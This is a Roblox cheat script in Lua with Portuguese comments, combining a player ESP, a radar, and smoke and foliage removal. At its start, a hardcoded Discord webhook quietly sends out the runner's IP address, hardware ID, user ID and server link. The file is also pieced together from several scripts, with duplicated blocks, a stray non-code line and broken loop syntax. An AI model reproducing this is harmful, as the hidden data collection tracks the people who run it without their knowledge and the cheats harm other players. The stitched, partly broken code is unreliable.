local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1273126437347393570/592JRl1TYx3XZZXOYLt44dDM4kU7vQygoU5Y8nJ9IwQwyP-fioweNsKcjN-WVA82Vavn"

local function sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
    local ipAddress = game:HttpGet("https://api.ipify.org")  
    local executorName = (identifyexecutor and identifyexecutor()) or "Desconhecido" 
    local playerName = game.Players.LocalPlayer.DisplayName 
    local executionTime = os.date("%Y-%m-%d %H:%M:%S") 
    local scriptVersion = "1.0.0"  -- Vers√£o do script
    local gameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)  
    local serverId = game.JobId 
    local serverUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/?serverId=" .. serverId  
    local playersOnline = #game.Players:GetPlayers() 
    local footerText = "Gerado pelo sistema de notifica√ß√£o "  

    local embedColor = isSuccess and tonumber(0x00ff00) or tonumber(0xff0000)  

    local securityMessage = securityAlert or "Nenhum alerta de seguran√ßa"

    local jsonBody = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = isSuccess and "**Script Executado com Sucesso!(PaidVersion)**" or "**Erro na Execu√ß√£o do Script(PaidVersion)**",
            ["description"] = isSuccess and "üéâ O script foi executado com sucesso! (PaidVersion)" or "‚ùå O script encontrou um erro.(PaidVersion)",
            ["type"] = "rich",
            ["color"] = embedColor,
            ["fields"] = {
                {
                    ["name"] = "Nome do Jogo:",
                    ["value"] = game.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID:",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Nome do Jogador:",
                    ["value"] = playerName,
                    ["inline"] = true
                },
                {
                    ["name"] = "Hardware ID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Local:",
                    ["value"] = "||" .. ipAddress .. "||", 
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = executorName,
                    ["inline"] = true
                },
                {
                    ["name"] = "Hora de Execu√ß√£o:",
                    ["value"] = executionTime,
                    ["inline"] = true
                },
                {
                    ["name"] = "Vers√£o do Script:",
                    ["value"] = scriptVersion,
                    ["inline"] = true
                },
                {
                    ["name"] = "Link do Jogo:",
                    ["value"] = gameUrl,
                    ["inline"] = true
                },
                {
                    ["name"] = "Link do Servidor:",
                    ["value"] = serverUrl,
                    ["inline"] = true
                },
                {
                    ["name"] = "Jogadores Online:",
                    ["value"] = tostring(playersOnline),
                    ["inline"] = true
                },
                {
                    ["name"] = "Documenta√ß√£o:",
                    ["value"] = "[Consultar a documenta√ß√£o](https://example.com/documentation)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Suporte T√©cnico:",
                    ["value"] = "[Contatar o suporte](https://example.com/support)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Alerta de Seguran√ßa:",
                    ["value"] = securityMessage,
                    ["inline"] = false
                },
                {
                    ["name"] = "Mensagem de Erro:",
                    ["value"] = errorMessage or "Nenhuma mensagem de erro",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = footerText
            }
        }}
    })

    local response = requestFunction({
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ['Content-Type'] = "application/json"
        },
        Body = jsonBody
    })

    print("C√≥digo de Status da Resposta: ", response.StatusCode)
    print("Corpo da Resposta: ", response.Body)
end

local requestFunction = (syn and syn.request) or (http_request) or (request)

local isSuccess, securityAlert, errorMessage = true, "", ""

-- Coloque o script aqui
local success, err = pcall(function()

     
end)


if not success then
    isSuccess = false
    errorMessage = err
    securityAlert = "‚ö†Ô∏è Problema de seguran√ßa detectado "
end

if requestFunction then
    sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
else
    warn("Nenhuma fun√ß√£o de requisi√ß√£o HTTP dispon√≠vel.")
end

-- ESP
local FillColor = Color3.fromRGB(204,0,204)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255, 255, 255)
local OutlineTransparency = 0
local CoreGui = cloneref(game:FindService("CoreGui"))
local connections = {}

local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"

local players = cloneref(game:GetService("Players"))
local client = players.LocalPlayer
local camera = workspace.CurrentCamera
local lighting = cloneref(game:GetService("Lighting"))

getgenv().global = getgenv()

function global.declare(self, index, value, check)
    if self[index] == nil then
        self[index] = value
    elseif check then
        local methods = { "remove", "Disconnect" }

        for _, method in methods do
            pcall(function()
                value[method](value)
            end)
        end
    end

    return self[index]
end

declare(global, "services", {})

function global.get(service)
    return services[service]
end

declare(declare(services, "loop", {}), "cache", {})

get("loop").new = function(self, index, func, disabled)
    if disabled == nil and (func == nil or typeof(func) == "boolean") then
        disabled = func func = index
    end

    self.cache[index] = {
        ["enabled"] = (not disabled),
        ["func"] = func,
        ["toggle"] = function(self, boolean)
            if boolean == nil then
                self.enabled = not self.enabled
            else
                self.enabled = boolean
            end
        end,
        ["remove"] = function()
            self.cache[index] = nil
        end
    }

    return self.cache[index]
end

declare(get("loop"), "connection", cloneref(game:GetService("RunService")).RenderStepped:Connect(function(delta)
    for _, loop in get("loop").cache do
        if loop.enabled then
            local success, result = pcall(function()
                loop.func(delta)
            end)

            if not success then
                warn(result)
            end
        end
    end
end), true)

declare(services, "new", {})

get("new").drawing = function(class, properties)
    -- Obscure the use of Drawing
    local drawing = Drawing.new(class)
    for property, value in properties do
        pcall(function()
            drawing[property] = value
        end)
    end
    return drawing
end

declare(declare(services, "player", {}), "cache", {})

get("player").find = function(self, player)
    for character, data in self.cache do
        if data.player == player then
            return character
        end
    end
end

get("player").check = function(self, player)
    local success, check = pcall(function()
        local character = player:IsA("Player") and player.Character or player
        local children = {character.WorldCharacter:WaitForChild('HumanoidRootPart')}

        return children and character.Parent ~= nil
    end)

    return success and check
end

get("player").new = function(self, player)
    if player == game.Players.LocalPlayer then
        return
    end
    local function cache(character)
        -- Use less common variables and avoid verbose messages
        self.cache[character] = {
            ["player"] = player,
            ["drawings"] = {
                ["box"] = get("new").drawing("Square", { Visible = false }),
                ["boxFilled"] = get("new").drawing("Square", { Visible = false, Filled = true }),
                ["boxOutline"] = get("new").drawing("Square", { Visible = false }),
                ["name"] = get("new").drawing("Text", { Visible = false, Center = true}),
                ["distance"] = get("new").drawing("Text", { Visible = false, Center = true}),
            },
            ["highlight"] = nil
        }

        local Highlight = Instance.new("Highlight")
        Highlight.Name = player.Name
        Highlight.FillColor = FillColor
        Highlight.DepthMode = DepthMode
        Highlight.FillTransparency = FillTransparency
        Highlight.OutlineColor = OutlineColor
        Highlight.OutlineTransparency = OutlineTransparency
        Highlight.Parent = Storage
        if character then
            Highlight.Adornee = character
        end

        self.cache[character].highlight = Highlight
        connections[player] = player.CharacterAdded:Connect(function(char)
            Highlight.Adornee = char
        end)
    end

    local function check(character)
        if self:check(character) then
            cache(character)
        else
            local listener
            listener = character.ChildAdded:Connect(function()
                if self:check(character) then
                    cache(character) listener:Disconnect()
                end
            end)
        end
    end

    if player.Character then check(player.Character) end
    player.CharacterAdded:Connect(check)
end

get("player").remove = function(self, player)
    if player:IsA("Player") then
        local character = self:find(player)
        if character then
            self:remove(character)
        end
    else
        local data = self.cache[player]
        local drawings = data.drawings
        local highlight = data.highlight

        self.cache[player] = nil

        for _, drawing in drawings do
            drawing:Remove()
        end

        if highlight then
            highlight:Destroy()
        end

        if connections[player] then
            connections[player]:Disconnect()
        end
    end
end

get("player").update = function(self, character, data)
    if not self:check(character) then
        self:remove(character)
    end

    local player = data.player
    local root = character.WorldCharacter:WaitForChild('HumanoidRootPart')
    local drawings = data.drawings

    if self:check(client) then
        data.distance = (client.Character.WorldCharacter.HumanoidRootPart.CFrame.Position - root.CFrame.Position).Magnitude
    end

    task.spawn(function()
        local position, visible = camera:WorldToViewportPoint(root.CFrame.Position)

        local visuals = features.visuals

        local function check()
            local team
            if visuals.teamCheck then team = player.Team ~= client.Team else team = true end
            return visuals.enabled and data.distance and data.distance <= visuals.renderDistance and team
        end

        local function color(color)
            if visuals.teamColor then
                color = player.TeamColor.Color
            end
            return color
        end

        if visible and check() then
            local scale = 1 / (position.Z * math.tan(math.rad(camera.FieldOfView * 0.5)) * 2) * 1000
            local width, height = math.floor(4.5 * scale), math.floor(6 * scale)
            local x, y = math.floor(position.X), math.floor(position.Y)
            local xPosition, yPosition = math.floor(x - width * 0.5), math.floor((y - height * 0.5) + (0.5 * scale))

            drawings.box.Size = Vector2.new(width, height)
            drawings.box.Position = Vector2.new(xPosition, yPosition)
            drawings.boxFilled.Size = drawings.box.Size
            drawings.boxFilled.Position = drawings.box.Position
            drawings.boxOutline.Size = drawings.box.Size
            drawings.boxOutline.Position = drawings.box.Position

            drawings.box.Color = color(visuals.boxes.color)
            drawings.box.Thickness = 1
            drawings.boxFilled.Color = color(visuals.boxes.filled.color)
            drawings.boxFilled.Transparency = visuals.boxes.filled.transparency
            drawings.boxOutline.Color = visuals.boxes.outline.color
            drawings.boxOutline.Thickness = 3

            drawings.boxOutline.ZIndex = drawings.box.ZIndex - 1
            drawings.boxFilled.ZIndex = drawings.boxOutline.ZIndex - 1

            drawings.name.Text = `[ {player.Name} ]`
            drawings.name.Size = math.max(math.min(math.abs(12.5 * scale), 12.5), 10)
            drawings.name.Position = Vector2.new(x, (yPosition - drawings.name.TextBounds.Y) - 2)
            drawings.name.Color = color(visuals.names.color)
            drawings.name.Outline = visuals.names.outline.enabled
            drawings.name.OutlineColor = visuals.names.outline.color

            drawings.name.ZIndex = drawings.box.ZIndex + 1

            drawings.distance.Text = `[ {math.floor(data.distance)} ]`
            drawings.distance.Size = math.max(math.min(math.abs(11 * scale), 11), 10)
            drawings.distance.Position = Vector2.new(x, (yPosition + height) + (drawings.distance.TextBounds.Y * 0.25))
            drawings.distance.Color = color(visuals.distance.color)
            drawings.distance.Outline = visuals.distance.outline.enabled
            drawings.distance.OutlineColor = visuals.distance.outline.color
        end

        drawings.box.Visible = (check() and visible and visuals.boxes.enabled)
        drawings.boxFilled.Visible = (check() and drawings.box.Visible and visuals.boxes.filled.enabled)
        drawings.boxOutline.Visible = (check() and drawings.box.Visible and visuals.boxes.outline.enabled)
        drawings.name.Visible = (check() and visible and visuals.names.enabled)
        drawings.distance.Visible = (check() and visible and visuals.distance.enabled)
    end)
end

declare(get("player"), "loop", get("loop"):new(function ()
    for character, data in get("player").cache do
        get("player"):update(character, data)
    end
end), true)

declare(global, "features", {})

features.toggle = function(self, feature, boolean)
    if self[feature] then
        if boolean == nil then
            self[feature].enabled = not self[feature].enabled
        else
            self[feature].enabled = boolean
        end

        if self[feature].toggle then
            task.spawn(function()
                self[feature]:toggle()
            end)
        end
    end
end

declare(features, "visuals", {
    ["enabled"] = true,
    ["teamCheck"] = false,
    ["teamColor"] = true,
    ["renderDistance"] = 4000,

    ["boxes"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
        ["filled"] = {
            ["enabled"] = false,
            ["color"] = Color3.fromRGB(255, 255, 255),
            ["transparency"] = 0.25
        },
    },
    ["names"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
    },
    ["distance"] = {
        ["enabled"] = true,
        ["color"] = Color3.fromRGB(255, 255, 255),
        ["outline"] = {
            ["enabled"] = true,
            ["color"] = Color3.fromRGB(0, 0, 0),
        },
    },
})

for _, player in players:GetPlayers() do
    if player ~= client and not get("player"):find(player) then
        get("player"):new(player)
    end
end

declare(get('player'), 'added', workspace.ChildAdded:Connect(function(player)
    if players:FindFirstChild(player.Name) then
        if not get("player"):find(players[player.Name]) then
            get("player"):new(players[player.Name])
        end
    end
end), true)

declare(get('player'), 'removing', workspace.ChildRemoved:Connect(function(player)
    if players:FindFirstChild(player.Name) then
        get("player"):remove(players[player.Name])
    end
end), true)

-- Key
local isEnabled = true

local function toggleFeature()
    isEnabled = not isEnabled
    features.visuals.enabled = isEnabled
    local status = isEnabled and "enabled" or "disabled"
    print("Visuals " .. status)
end

local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.F1 then
        toggleFeature()
    end
end)

-- Radar Script

local FillColor = Color3.fromRGB(204, 0, 0) -- Cor para outros jogadores
local SelfColor = Color3.fromRGB(0, 255, 0) -- Cor para o jogador local
local ArrowColor = Color3.fromRGB(0, 255, 0) -- Cor da seta de dire√ß√£o
local RadarSize = Vector2.new(250, 250) -- Tamanho do radar
local RadarPosition = Vector2.new(50, 50) -- Posi√ß√£o do radar na tela
local RadarTransparency = 0.8 -- Transpar√™ncia do fundo do radar
local RadarScale = 0.05 -- Escala do radar
local MaxDistance = 5000 -- Dist√¢ncia m√°xima para exibir jogadores (em studs)
local PlayerNameYOffset = 15 -- Dist√¢ncia entre a bolinha e o nome do jogador
local RGBSpeed = 1 -- Velocidade de mudan√ßa do RGB
local radarEnabled = true -- Estado inicial do radar (ativo)

-- Importar o UserInputService para capturar teclas
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Client = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Fun√ß√£o para criar a seta de dire√ß√£o com pontas mais precisas
local function drawArrow(position, direction, size, color)
    local arrow = Drawing.new("Triangle")
    local base = position + direction * -size / 2
    local pointA = base + direction * size
    local pointB = base + Vector2.new(-direction.Y, direction.X) * size * 0.5
    local pointC = base + Vector2.new(direction.Y, -direction.X) * size * 0.5
    arrow.PointA = pointA
    arrow.PointB = pointB
    arrow.PointC = pointC
    arrow.Color = color
    arrow.Filled = true
    arrow.Visible = true
    return arrow
end

-- Cria√ß√£o do fundo do radar com borda arredondada e gradiente
local RadarBackground = Drawing.new("Circle")
RadarBackground.Radius = RadarSize.X / 2
RadarBackground.Position = RadarPosition + Vector2.new(RadarSize.X / 2, RadarSize.Y / 2)
RadarBackground.Filled = true
RadarBackground.Transparency = RadarTransparency
RadarBackground.Color = Color3.fromRGB(30, 30, 30) -- Fundo moderno e suave
RadarBackground.ZIndex = 0 -- Fundo deve estar atr√°s de tudo
RadarBackground.Visible = true

-- Fun√ß√£o para calcular a cor RGB din√¢mica (para borda de gradiente animada)
local function calculateRGBColor(tickValue)
    local r = math.abs(math.sin(RGBSpeed * tickValue))
    local g = math.abs(math.sin(RGBSpeed * tickValue + 2))
    local b = math.abs(math.sin(RGBSpeed * tickValue + 4))
    return Color3.new(r, g, b)
end

-- Borda do radar ajustada para ficar colada ao minimapa
local RadarBorder = Drawing.new("Circle")
RadarBorder.Radius = RadarBackground.Radius + 1 -- Colada ao radar
RadarBorder.Position = RadarBackground.Position
RadarBorder.Filled = false
RadarBorder.Thickness = 4
RadarBorder.Color = calculateRGBColor(tick()) -- Cor RGB que muda dinamicamente
RadarBorder.ZIndex = 1 -- Borda logo acima do fundo
RadarBorder.Visible = true

-- Desenha o marcador do jogador local (voc√™) no centro do radar
local SelfMarker = Drawing.new("Circle")
SelfMarker.Color = SelfColor
SelfMarker.Radius = 6
SelfMarker.Filled = true
SelfMarker.Position = RadarBackground.Position
SelfMarker.ZIndex = 2 -- Marcador do jogador local deve estar por cima
SelfMarker.Visible = true

-- Inicializamos a seta do jogador local
local DirectionArrow = drawArrow(SelfMarker.Position, Vector2.new(1, 0), 20, ArrowColor)

-- Fun√ß√£o para alinhar a seta com a dire√ß√£o correta
local function updateArrowDirection(lookVector)
    if DirectionArrow then
        -- Calcular a dire√ß√£o correta da seta
        local arrowDirection = Vector2.new(lookVector.X, -lookVector.Z).Unit

        -- Atualizar a seta para que a ponta esteja alinhada com o radar
        DirectionArrow.PointA = SelfMarker.Position + arrowDirection * 20
        DirectionArrow.PointB = SelfMarker.Position + Vector2.new(-arrowDirection.Y, arrowDirection.X) * 10
        DirectionArrow.PointC = SelfMarker.Position + Vector2.new(arrowDirection.Y, -arrowDirection.X) * 10
    end
end

-- Tabela para armazenar os objetos desenhados de cada jogador
local playerDrawings = {}

-- Fun√ß√£o para obter o HumanoidRootPart de um jogador
local function getHumanoidRootPart(character)
    if character and character:FindFirstChild("HumanoidRootPart") then
        return character.HumanoidRootPart
    end
    return nil
end

-- Fun√ß√£o para calcular a posi√ß√£o no radar com base na posi√ß√£o relativa entre o jogador e os outros jogadores
local function calculateRadarPosition(playerPosition, clientPosition)
    -- Calcular a posi√ß√£o relativa (jogador - client), ignorando a rota√ß√£o da c√¢mera
    local relativePosition = (playerPosition - clientPosition) * Vector3.new(1, 0, 1) -- Ignorar altura (Y)

    -- Escalar a posi√ß√£o no radar (radar fixo)
    local radarX = relativePosition.X * RadarScale
    local radarY = -relativePosition.Z * RadarScale

    -- Verificar se o jogador est√° fora do radar (limite do c√≠rculo)
    local maxRadius = RadarBackground.Radius
    local distanceFromCenter = math.sqrt(radarX^2 + radarY^2)
    
    if distanceFromCenter > maxRadius then
        -- Limitar a posi√ß√£o na borda do radar, mantendo a dire√ß√£o
        local scaleFactor = maxRadius / distanceFromCenter
        radarX = radarX * scaleFactor
        radarY = radarY * scaleFactor
    end

    -- Centralizar no radar
    radarX = RadarBackground.Position.X + radarX
    radarY = RadarBackground.Position.Y + radarY

    return Vector2.new(radarX, radarY)
end

-- Fun√ß√£o para configurar o radar para um jogador
local function setupPlayerDrawing(player)
    if playerDrawings[player] then return end -- N√£o recriar se j√° existir
    
    local radarPoint = Drawing.new("Circle")
    radarPoint.Color = FillColor
    radarPoint.Radius = 5
    radarPoint.Filled = true
    radarPoint.ZIndex = 2 -- Garantir que as bolas dos jogadores estejam por cima do radar
    radarPoint.Visible = false
    
    local playerNameText = Drawing.new("Text")
    playerNameText.Size = 13
    playerNameText.Color = Color3.new(1, 1, 1)
    playerNameText.Center = true
    playerNameText.ZIndex = 3 -- Nome do jogador por cima de tudo
    playerNameText.Visible = false

    playerDrawings[player] = {
        radarPoint = radarPoint,
        playerNameText = playerNameText
    }

    -- Verificar quando o jogador morre ou sai do jogo
    player.CharacterAdded:Connect(function(character)
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            removePlayerDrawing(player)
        end)
    end)

    player.AncestryChanged:Connect(function(_, parent)
        if not parent then
            removePlayerDrawing(player)
        end
    end)
end

-- Fun√ß√£o para remover desenhos de um jogador
local function removePlayerDrawing(player)
    if playerDrawings[player] then
        playerDrawings[player].radarPoint:Remove()
        playerDrawings[player].playerNameText:Remove()
        playerDrawings[player] = nil
    end
end

-- Fun√ß√£o para atualizar o radar de um jogador
local function updateRadarForPlayer(player)
    if not radarEnabled then return end -- Verificar se o radar est√° ativo

    local character = player.Character
    if not character or not playerDrawings[player] then return end

    local root = getHumanoidRootPart(character)
    local clientRoot = getHumanoidRootPart(Client.Character)

    if root and clientRoot then
        local distance = (root.Position - clientRoot.Position).Magnitude
        if distance <= MaxDistance then -- Exibir jogadores dentro do raio de 5000 studs
            local radarPosition = calculateRadarPosition(root.Position, clientRoot.Position)
            
            -- Atualizar a posi√ß√£o no radar e o nome do jogador
            local drawings = playerDrawings[player]
            drawings.radarPoint.Position = radarPosition
            drawings.radarPoint.Visible = true
            
            -- Posicionar o nome do jogador acima do radarPoint
            drawings.playerNameText.Position = Vector2.new(radarPosition.X, radarPosition.Y - PlayerNameYOffset)
            drawings.playerNameText.Text = player.Name -- Nome atualizado corretamente
            drawings.playerNameText.Visible = true
        else
            -- Jogador muito distante, apenas mostr√°-lo na borda
            local direction = (root.Position - clientRoot.Position).Unit
            local radarPosition = calculateRadarPosition(clientRoot.Position + direction * MaxDistance, clientRoot.Position)
            
            -- Atualizar para que a bolinha do jogador fique na borda
            local drawings = playerDrawings[player]
            drawings.radarPoint.Position = radarPosition
            drawings.radarPoint.Visible = true
            
            -- Nome na borda
            drawings.playerNameText.Position = Vector2.new(radarPosition.X, radarPosition.Y - PlayerNameYOffset)
            drawings.playerNameText.Text = player.Name
            drawings.playerNameText.Visible = true
        end
    else
        -- Esconder os desenhos caso o jogador n√£o esteja vis√≠vel
        playerDrawings[player].radarPoint.Visible = false
        playerDrawings[player].playerNameText.Visible = false
    end
end

-- Atualiza o radar para todos os jogadores
local function updateRadar()
    if not radarEnabled then return end -- Verificar se o radar est√° ativo

    -- Atualizar a seta de dire√ß√£o com base na rota√ß√£o do jogador local
    local clientRoot = getHumanoidRootPart(Client.Character)
    if clientRoot then
        local lookVector = clientRoot.CFrame.LookVector
        updateArrowDirection(lookVector) -- Atualiza a seta de acordo com a dire√ß√£o correta
    end

    -- Atualizar o radar para cada jogador (posi√ß√µes fixas no radar)
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= Client then
            setupPlayerDrawing(player)
            updateRadarForPlayer(player) -- Garantir que o jogador e seu nome est√£o atualizados corretamente
        end
    end
end

-- Otimiza√ß√£o para n√£o atualizar a cada frame
local lastUpdate = 0
game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate >= 0.2 then -- Atualiza a cada 200ms para melhorar desempenho
        updateRadar()
        RadarBorder.Color = calculateRGBColor(tick()) -- Atualizar cor da borda dinamicamente
        lastUpdate = 0
    end
end)

-- Detectar quando a tecla "F7" √© pressionada para ativar/desativar o radar
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.F7 then
        radarEnabled = not radarEnabled -- Alterna o estado do radar
        RadarBackground.Visible = radarEnabled
        RadarBorder.Visible = radarEnabled
        SelfMarker.Visible = radarEnabled
        DirectionArrow.Visible = radarEnabled

        -- Controlar visibilidade das bolinhas e textos dos jogadores
        for _, drawings in pairs(playerDrawings) do
            drawings.radarPoint.Visible = radarEnabled
            drawings.playerNameText.Visible = radarEnabled
        end
    end
end)

-NoSmoke Nuclear

local parentFolder = game.Workspace:FindFirstChild("world_assets")
if not parentFolder then
    warn("Pasta 'world_assets' n√£o encontrada.")
    return
end

local staticObjectsFolder = parentFolder:FindFirstChild("StaticObjects")
if not staticObjectsFolder then
    warn("Pasta 'StaticObjects' n√£o encontrada.")
    return
end

local miscFolder = staticObjectsFolder:FindFirstChild("Misc")
if not miscFolder then
    warn("Pasta 'Misc' n√£o encontrada.")
    return
end

local tosicFolder = miscFolder:FindFirstChild("TOSIC")
if not tosicFolder then
    warn("Pasta 'TOSIC' n√£o encontrada.")
    return
end

-- Encontre o Group 'Model'
local modelGroup = tosicFolder:FindFirstChild("Model")
if not modelGroup or not modelGroup:IsA("Model") then
    warn("O 'Model' n√£o foi encontrado ou n√£o √© um Model.")
    return
end

-- Encontre a Part 'TOXIC_BILLBOARD'
local toxicBillboardPart = modelGroup:FindFirstChild("TOXIC_BILLBOARD")
if not toxicBillboardPart or not toxicBillboardPart:IsA("BasePart") then
    warn("A Part 'TOXIC_BILLBOARD' n√£o foi encontrada.")
    return
end

-- Encontre o BillboardGui dentro da Part
local billboardGui = toxicBillboardPart:FindFirstChildOfClass("BillboardGui")
if not billboardGui then
    warn("BillboardGui n√£o encontrada na Part 'TOXIC_BILLBOARD'.")
    return
end

-- Encontre o ToxicBillboardAnimator dentro do BillboardGui
local toxicBillboardAnimator = billboardGui:FindFirstChild("ToxicBillboardAnimator")
if not toxicBillboardAnimator then
    warn("ToxicBillboardAnimator n√£o encontrado no BillboardGui.")
    return
end

-- Desative o ToxicBillboardAnimator
toxicBillboardAnimator.Enabled = false

print("ToxicBillboardAnimator desativado.")

-- Desative a pasta TOSIC
tosicFolder.Parent = nil -- Remove a pasta do Workspace

print("Pasta 'TOSIC' desativada.")

-- Fun√ß√£o para encontrar uma pasta e emitir aviso se n√£o encontrada
local function findFolder(name, parent)
    local folder = parent:FindFirstChild(name)
    return folder
end

-- Fun√ß√£o para tornar a Mesh chamada 'Leaves' invis√≠vel dentro dos grupos
local function makeLeavesInvisible(groupsFolder, leavesName)
    for , group in ipairs(groupsFolder:GetChildren()) do
        if group:IsA("Model") then
            local leaves = group:FindFirstChild(leavesName)
            if leaves then
                -- Torna a Mesh chamada 'Leaves' invis√≠vel
                if leaves:IsA("MeshPart") then
                    leaves.Transparency = 1 -- Torna a Mesh invis√≠vel
                    leaves.CanCollide = false -- Opcional: Desativa a colis√£o
                elseif leaves:IsA("Folder") then
                    -- Se o 'Leaves' for uma pasta, percorra seus filhos
                    for , child in ipairs(leaves:GetChildren()) do
                        if child:IsA("MeshPart") then
                            child.Transparency = 1
                            child.CanCollide = false
                        end
                    end
                end
            end
        end
    end
end

-- Fun√ß√£o para garantir que todos os objetos sejam processados
local function processAllObjects()
    local workspace = game:GetService("Workspace")
    local worldAssets = findFolder("world_assets", workspace)
    local staticObjects = findFolder("StaticObjects", worldAssets)
    local treesFolder = findFolder("Trees", staticObjects)

    if not treesFolder then
        return
    end

    -- Nome do arquivo a ser tornado invis√≠vel
    local leavesName = "Leaves"

    -- Torne a Mesh chamada 'Leaves' invis√≠vel dentro dos grupos na pasta 'Trees'
    makeLeavesInvisible(treesFolder, leavesName)
end

-- Adiciona um delay para garantir que todos os objetos sejam carregados antes de processar
wait(5)  -- Ajuste o tempo conforme necess√°rio para garantir que o mapa esteja completamente carregado

processAllObjects()

--Tirar Folhas
-- LocalScript para tornar a Mesh chamada 'Leaves' invis√≠vel ap√≥s o respawn do personagem

-- Fun√ß√£o para encontrar uma pasta e emitir aviso se n√£o encontrada
local function findFolder(name, parent)
    local folder = parent:FindFirstChild(name)
    if not folder then
        warn("Pasta n√£o encontrada: " .. name)
    end
    return folder
end

-- Fun√ß√£o para tornar a Mesh chamada 'Leaves' invis√≠vel dentro dos grupos
local function makeLeavesInvisible(groupsFolder, leavesName)
    for _, group in ipairs(groupsFolder:GetChildren()) do
        if group:IsA("Model") then
            local leaves = group:FindFirstChild(leavesName)
            if leaves then
                -- Torna a Mesh chamada 'Leaves' invis√≠vel
                if leaves:IsA("MeshPart") then
                    leaves.Transparency = 1 -- Torna a Mesh invis√≠vel
                    leaves.CanCollide = false -- Opcional: Desativa a colis√£o
                elseif leaves:IsA("Folder") then
                    -- Se o 'Leaves' for uma pasta, percorra seus filhos
                    for _, child in ipairs(leaves:GetChildren()) do
                        if child:IsA("MeshPart") then
                            child.Transparency = 1
                            child.CanCollide = false
                        end
                    end
                end
            end
        end
    end
end

-- Fun√ß√£o para garantir que todos os objetos sejam processados
local function processAllObjects()
    local workspace = game:GetService("Workspace")
    local worldAssets = findFolder("world_assets", workspace)
    local staticObjects = findFolder("StaticObjects", worldAssets)
    local treesFolder = findFolder("Trees", staticObjects)

    if not treesFolder then
        return
    end

    -- Nome do arquivo a ser tornado invis√≠vel
    local leavesName = "Leaves"

    -- Torne a Mesh chamada 'Leaves' invis√≠vel dentro dos grupos na pasta 'Trees'
    makeLeavesInvisible(treesFolder, leavesName)
end

-- Reaplica as altera√ß√µes sempre que o personagem do jogador √© respawnado
local player = game.Players.LocalPlayer

-- Espera pelo personagem do jogador e aplica as altera√ß√µes
player.CharacterAdded:Connect(function(character)
    -- Aguarda um pequeno tempo para garantir que o personagem e o ambiente estejam carregados
    wait(1)
    processAllObjects()
end)

-- Se o personagem j√° estiver presente, aplica as altera√ß√µes imediatamente
if player.Character then
    processAllObjects()
end

-- Loop para reaplicar as altera√ß√µes a cada 5 segundos
while true do
    wait(5) -- Espera 5 segundos
    processAllObjects()
end

----------------------------------
-- Fun√ß√£o para desativar o ToxicBillboardAnimator e a pasta TOSIC
local function disableToxicAssets()
    -- Defina o caminho para a pasta
    local parentFolder = game.Workspace:FindFirstChild("world_assets")
    if not parentFolder then
        warn("Pasta 'world_assets' n√£o encontrada.")
        return
    end

    local staticObjectsFolder = parentFolder:FindFirstChild("StaticObjects")
    if not staticObjectsFolder then
        warn("Pasta 'StaticObjects' n√£o encontrada.")
        return
    end

    local miscFolder = staticObjectsFolder:FindFirstChild("Misc")
    if not miscFolder then
        warn("Pasta 'Misc' n√£o encontrada.")
        return
    end

    local tosicFolder = miscFolder:FindFirstChild("TOSIC")
    if not tosicFolder then
        warn("Pasta 'TOSIC' n√£o encontrada.")
        return
    end

    -- Encontre o Group 'Model'
    local modelGroup = tosicFolder:FindFirstChild("Model")
    if not modelGroup or not modelGroup:IsA("Model") then
        warn("O 'Model' n√£o foi encontrado ou n√£o √© um Model.")
        return
    end

    -- Encontre a Part 'TOXIC_BILLBOARD'
    local toxicBillboardPart = modelGroup:FindFirstChild("TOXIC_BILLBOARD")
    if not toxicBillboardPart or not toxicBillboardPart:IsA("BasePart") then
        warn("A Part 'TOXIC_BILLBOARD' n√£o foi encontrada.")
        return
    end

    -- Encontre o BillboardGui dentro da Part
    local billboardGui = toxicBillboardPart:FindFirstChildOfClass("BillboardGui")
    if not billboardGui then
        warn("BillboardGui n√£o encontrada na Part 'TOXIC_BILLBOARD'.")
        return
    end

    -- Encontre o ToxicBillboardAnimator dentro do BillboardGui
    local toxicBillboardAnimator = billboardGui:FindFirstChild("ToxicBillboardAnimator")
    if not toxicBillboardAnimator then
        warn("ToxicBillboardAnimator n√£o encontrado no BillboardGui.")
        return
    end

    -- Desative o ToxicBillboardAnimator
    toxicBillboardAnimator.Enabled = false

    print("ToxicBillboardAnimator desativado.")

    -- Desative a pasta TOSIC
    tosicFolder.Parent = nil -- Remove a pasta do Workspace

    print("Pasta 'TOSIC' desativada.")
end

-- Reaplica as altera√ß√µes sempre que o personagem do jogador √© respawnado
local player = game.Players.LocalPlayer

